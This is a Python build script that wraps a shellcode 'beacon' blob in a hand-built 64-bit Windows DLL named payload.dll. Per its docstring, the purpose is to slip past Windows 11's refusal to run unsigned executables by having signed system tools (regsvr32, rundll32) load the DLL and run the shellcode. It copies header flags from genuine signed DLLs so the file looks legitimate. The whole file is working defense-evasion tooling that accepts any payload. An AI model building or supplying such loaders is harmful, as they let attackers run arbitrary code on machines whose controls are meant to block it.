#!/usr/bin/env python3
"""mk_dll.py — emit the Windows x64 *DLL* artifact (PE32+ .dll).

Wraps the assembled PIC shellcode (build/beacon_windows.bin) in a minimal but
structurally valid PE32+ *dynamic library* that a signed Microsoft LOLBin
(rundll32 / regsvr32) will happily LoadLibrary() on an unsigned box. The
whole point: the user's Win11 rejects an unsigned .exe with "Access is denied"
(error 5), but the loader will still map + import + entry-point a DLL that a
trusted system tool asks it to run.

Layout (single .text section, RWX, all RVAs = 0x1000 + file offset):

  +0x000  beacon blob (call/pop PIC, entered via `call`, rets)
  +0x388  DllRegisterServer wrapper:  call beacon ; xor rax,rax ; ret
  +0x398  DllMain:                    mov eax,1 ; ret        (returns TRUE)
  +0x3A0  DllUnregisterServer:        xor rax,rax ; ret      (S_OK; nothing to undo)
  +0x3A8  IMAGE_EXPORT_DIRECTORY (40 B)
  +0x3D0  ordinal table  [0,1,2]
  +0x3D8  EAT  [DllMain, DllRegisterServer, DllUnregisterServer] (RVAs)
  +0x3E8  ENT  [name0, name1, name2]  (RVA to each name string)
  +0x3F8  "DllMain\0"
  +0x400  "DllRegisterServer\0"
  +0x418  "DllUnregisterServer\0"
  +0x430  "payload.dll\0"   (export Name; matches the real file name)

No import directory (DataDir[1] = 0): the beacon resolves ntdll/NtWriteFile
from the PEB at runtime, so there is nothing to bind. No relocations: every
internal reference is a RVA or a PIC displacement, so the image is correct at
ANY load base (the Unicorn test proves it at two bases). DllCharacteristics
and the COFF characteristics mirror real signed x64 DLLs (wslcsdk.dll,
_nvngx.dll): COFF 0x2022 (DLL|EXECUTABLE|0x20), DllChar 0x4160.

regsvr32 /s payload.dll  ->  LoadLibrary -> DllMain(TRUE) ->
    GetProcAddress("DllRegisterServer") -> wrapper -> beacon writes the token
    to stdout -> ret -> S_OK(0). rundll32 payload.dll,DllRegisterServer does
    the same, and regsvr32 /u payload.dll succeeds too (the
    DllUnregisterServer stub returns S_OK), so the DLL is a complete,
    standard regsvr32 citizen in both directions.

usage:
  mk_dll.py                     — wrap build/beacon_windows.bin -> build/payload.dll
  mk_dll.py [out.dll]           — custom output, default blob
  mk_dll.py in.bin out.dll      — custom blob + output
"""

import struct
import sys
from pathlib import Path

HERE = Path(__file__).resolve().parent.parent
BLOB_PATH = HERE / "build" / "beacon_windows.bin"
OUT_PATH  = HERE / "build" / "payload.dll"

# --- flags (measured from real signed x64 DLLs: wslcsdk.dll, _nvngx.dll) ---
MACHINE_X86_64    = 0x8664
OPT_MAGIC_PE32P   = 0x020B
SUBSYSTEM_CONSOLE = 3
COFF_CHARS_DLL    = 0x2022    # DLL | EXECUTABLE | 0x20  (as in real x64 DLLs)
DLL_CHARACTERISTICS = 0x4160  # as in wslcsdk.dll / _nvngx.dll (signed, x64)
TIME_DATE_STAMP   = 0x60000000  # deterministic, like mk_pe.py

IMAGE_BASE     = 0x180000000
SECT_ALIGN     = 0x1000
FILE_ALIGN     = 0x200
HDR_SIZE       = 0x200                 # headers padded to FileAlignment
TEXT_RVA       = 0x1000                # VA of .text  =>  RVA = 0x1000 + offset
TEXT_RAW       = 0x200                 # file offset of .text raw data

# --- fixed in-image code fragments ----------------------------------------
DLLMAIN = b"\xB8\x01\x00\x00\x00\xC3"     # mov eax,1 ; ret      (TRUE)
DLLUNREG = b"\x48\x31\xC0\xC3"            # xor rax,rax ; ret    (S_OK)
# wrapper body:  E8 <rel32>  48 31 C0  C3   =  call beacon ; xor rax,rax ; ret
# (rel32 is filled in once the beacon offset is known; total 9 bytes)
EXPORT_NAME = b"payload.dll"
FUNCTION_NAMES = (b"DllMain", b"DllRegisterServer",
                  b"DllUnregisterServer")   # ordinal 0, 1, 2


def align_up(x: int, a: int) -> int:
    return ((x + a - 1) // a) * a


def dos_stub() -> bytes:
    out = bytearray(0x80)
    struct.pack_into("<H", out, 0x00, 0x5A4D)     # e_magic "MZ"
    struct.pack_into("<H", out, 0x0A, 0x0004)     # e_cparhdr
    struct.pack_into("<H", out, 0x0E, 0x0FFF)     # e_maxalloc
    struct.pack_into("<H", out, 0x14, 0xF6F0)     # e_csum (decorative)
    struct.pack_into("<H", out, 0x1A, 0x000F)     # e_lfarss (decorative)
    struct.pack_into("<I", out, 0x3C, 0x80)       # e_lfanew
    msg = b"This program cannot be run in DOS mode.\r\n$"
    out[0x40:0x40 + len(msg)] = msg
    return bytes(out)


def _layout(blob: bytes):
    """Compute every .text offset + RVA (RVA = TEXT_RVA + offset)."""
    off_beacon = 0
    cur = align_up(len(blob), 8)

    off_wrapper = cur                 # 9 B: E8 rel32 ; 48 31 C0 ; C3
    cur = align_up(cur + 9, 8)

    off_dllmain = cur                 # 6 B: mov eax,1 ; ret
    cur = align_up(cur + len(DLLMAIN), 8)

    off_unreg = cur                   # 4 B: xor rax,rax ; ret  (S_OK)
    cur = align_up(cur + len(DLLUNREG), 8)

    off_expdir = cur                  # 40 B
    cur = align_up(cur + 40, 8)

    off_ord = cur                     # 3 x WORD = 6 B
    cur = align_up(cur + 6, 8)

    off_eat = cur                     # 3 x DWORD = 12 B
    cur = align_up(cur + 12, 8)

    off_ent = cur                     # 3 x DWORD = 12 B
    cur = align_up(cur + 12, 8)

    off_name0, off_name1, off_name2 = (
        cur,
        align_up(cur + len(FUNCTION_NAMES[0]) + 1, 8),
        align_up(align_up(cur + len(FUNCTION_NAMES[0]) + 1, 8)
                 + len(FUNCTION_NAMES[1]) + 1, 8),
    )
    cur = align_up(off_name2 + len(FUNCTION_NAMES[2]) + 1, 8)

    off_libname = cur                 # "payload.dll\0"
    vsize = align_up(cur + len(EXPORT_NAME) + 1, 8)
    raw = align_up(vsize, FILE_ALIGN)

    rva = lambda o: TEXT_RVA + o
    return {
        "off_beacon": off_beacon, "n_beacon": len(blob),
        "off_wrapper": off_wrapper, "off_dllmain": off_dllmain,
        "off_unreg": off_unreg,
        "off_expdir": off_expdir, "off_ord": off_ord, "off_eat": off_eat,
        "off_ent": off_ent, "off_name0": off_name0, "off_name1": off_name1,
        "off_name2": off_name2,
        "off_libname": off_libname,
        "vsize": vsize, "raw": raw,
        "rva_beacon": rva(off_beacon), "rva_wrapper": rva(off_wrapper),
        "rva_dllmain": rva(off_dllmain), "rva_unreg": rva(off_unreg),
        "rva_expdir": rva(off_expdir),
        "rva_ord": rva(off_ord), "rva_eat": rva(off_eat), "rva_ent": rva(off_ent),
        "rva_name0": rva(off_name0), "rva_name1": rva(off_name1),
        "rva_name2": rva(off_name2),
        "rva_libname": rva(off_libname),
    }


def make_dll(blob: bytes) -> bytes:
    L = _layout(blob)
    raw = L["raw"]
    vsize = L["vsize"]
    image_size = align_up(TEXT_RVA + vsize, SECT_ALIGN)

    # rel32 for the wrapper's `call beacon`: target = beacon offset, rip = wrapper+5
    rel32 = (L["off_beacon"]) - (L["off_wrapper"] + 5)
    assert -(2 ** 31) <= rel32 < 2 ** 31

    text = bytearray(raw)
    text[L["off_beacon"]:L["off_beacon"] + L["n_beacon"]] = blob

    struct.pack_into("<B", text, L["off_wrapper"], 0xE8)         # E8
    struct.pack_into("<i", text, L["off_wrapper"] + 1, rel32)    #   rel32 -> beacon
    text[L["off_wrapper"] + 5:L["off_wrapper"] + 9] = b"\x48\x31\xC0\xC3"  # xor rax,rax; ret

    text[L["off_dllmain"]:L["off_dllmain"] + len(DLLMAIN)] = DLLMAIN
    text[L["off_unreg"]:L["off_unreg"] + len(DLLUNREG)] = DLLUNREG

    # IMAGE_EXPORT_DIRECTORY (40 B): 11 fields
    struct.pack_into(
        "<IIHHIIIIIII", text, L["off_expdir"],
        0,                     # Characteristics
        TIME_DATE_STAMP,       # TimeDateStamp
        0, 0,                  # MajorVersion, MinorVersion
        L["rva_libname"],      # Name -> "payload.dll\0"
        1,                     # Base (first ordinal)
        3,                     # NumberOfFunctions
        3,                     # NumberOfNames
        L["rva_eat"],          # +0x1C AddressOfDirectory (EAT: function RVAs)
        L["rva_ent"],          # +0x20 AddressOfNameTable  (name-string RVAs)
        L["rva_ord"],          # +0x24 AddressOfOrdinalTable (ordinals)
    )
    struct.pack_into("<3H", text, L["off_ord"], 0, 1, 2)         # ORD: ord0..2
    struct.pack_into("<3I", text, L["off_eat"],
                     L["rva_dllmain"], L["rva_wrapper"], L["rva_unreg"])
    struct.pack_into("<3I", text, L["off_ent"],
                     L["rva_name0"], L["rva_name1"], L["rva_name2"])

    for off, nm in ((L["off_name0"], FUNCTION_NAMES[0]),
                    (L["off_name1"], FUNCTION_NAMES[1]),
                    (L["off_name2"], FUNCTION_NAMES[2])):
        text[off:off + len(nm) + 1] = nm + b"\0"
    text[L["off_libname"]:L["off_libname"] + len(EXPORT_NAME) + 1] = EXPORT_NAME + b"\0"

    # --- PE signature + COFF header ---------------------------------------
    coff = struct.pack(
        "<HHIIIHH",
        MACHINE_X86_64,        # Machine
        1,                     # NumberOfSections
        TIME_DATE_STAMP,       # TimeDateStamp
        0,                     # PointerToSymbolTable
        0,                     # NumberOfSymbols
        0xF0,                  # SizeOfOptionalHeader (PE32+)
        COFF_CHARS_DLL,        # Characteristics: DLL | EXECUTABLE | 0x20
    )
    assert len(coff) == 20

    # --- PE32+ optional header (0xF0 bytes) -------------------------------
    opt = bytearray(0xF0)
    struct.pack_into("<H", opt, 0x00, OPT_MAGIC_PE32P)
    struct.pack_into("<BB", opt, 0x02, 14, 0)        # linker version
    struct.pack_into("<I", opt, 0x04, raw)           # SizeOfCode
    struct.pack_into("<I", opt, 0x08, 0)             # SizeOfInitializedData
    struct.pack_into("<I", opt, 0x10, L["rva_dllmain"])  # AddressOfEntryPoint = DllMain
    struct.pack_into("<I", opt, 0x14, TEXT_RVA)      # BaseOfCode
    struct.pack_into("<Q", opt, 0x18, IMAGE_BASE)
    struct.pack_into("<I", opt, 0x20, SECT_ALIGN)
    struct.pack_into("<I", opt, 0x24, FILE_ALIGN)
    struct.pack_into("<H", opt, 0x28, 6)             # OS 6.0
    struct.pack_into("<H", opt, 0x2A, 0)
    struct.pack_into("<H", opt, 0x2C, 0)             # image version
    struct.pack_into("<H", opt, 0x2E, 0)
    struct.pack_into("<H", opt, 0x30, 6)             # subsystem version 6.0
    struct.pack_into("<H", opt, 0x32, 0)
    struct.pack_into("<I", opt, 0x38, image_size)    # SizeOfImage
    struct.pack_into("<I", opt, 0x3C, HDR_SIZE)      # SizeOfHeaders
    struct.pack_into("<I", opt, 0x40, 0)             # CheckSum (loader fills)
    struct.pack_into("<H", opt, 0x44, SUBSYSTEM_CONSOLE)
    struct.pack_into("<H", opt, 0x46, DLL_CHARACTERISTICS)
    struct.pack_into("<Q", opt, 0x48, 0x100000)      # stack reserve
    struct.pack_into("<Q", opt, 0x50, 0x1000)        # stack commit
    struct.pack_into("<Q", opt, 0x58, 0x100000)      # heap reserve
    struct.pack_into("<Q", opt, 0x60, 0x1000)        # heap commit
    struct.pack_into("<I", opt, 0x68, 0)             # LoaderFlags
    struct.pack_into("<I", opt, 0x6C, 16)            # NumberOfRvaAndSizes
    # DataDirectory[0] = Export (the only populated directory) @ opt+0x70
    struct.pack_into("<II", opt, 0x70, L["rva_expdir"], 40)

    # --- section header (.text, RWX) --------------------------------------
    sect = struct.pack(
        "8sIIIIIIHHI",
        b".text\0\0",
        vsize,                          # VirtualSize
        TEXT_RVA,                       # VirtualAddress
        raw,                            # SizeOfRawData
        TEXT_RAW,                       # PointerToRawData
        0, 0,                           # no relocations / line numbers
        0, 0,
        0x20 | 0x20000000 | 0x40000000 | 0x80000000,  # CODE|EXECUTE|READ|WRITE
    )
    assert len(sect) == 40

    headers = dos_stub() + b"PE\0\0" + coff + bytes(opt) + sect
    assert len(headers) < HDR_SIZE
    headers = headers.ljust(HDR_SIZE, b"\0")
    return headers + bytes(text)


def main() -> None:
    argv = [a for a in sys.argv[1:]]
    if len(argv) == 2:
        blob_path, out = Path(argv[0]), Path(argv[1])
    elif len(argv) == 1:
        blob_path, out = BLOB_PATH, Path(argv[0])
    else:
        blob_path, out = BLOB_PATH, OUT_PATH
    blob = blob_path.read_bytes()
    data = make_dll(blob)
    out.write_bytes(data)
    print(f"wrote {out} ({len(data)} bytes); blob {len(blob)} B")
    print(f"  imagebase {IMAGE_BASE:#x}  vsize {align_up(_layout(blob)['vsize'],8):#x}  "
          f"raw {_layout(blob)['raw']:#x}  file {len(data):#x}")
    print("  exports: DllMain, DllRegisterServer (beacon wrapper), "
          "DllUnregisterServer (S_OK stub)")


if __name__ == "__main__":
    main()
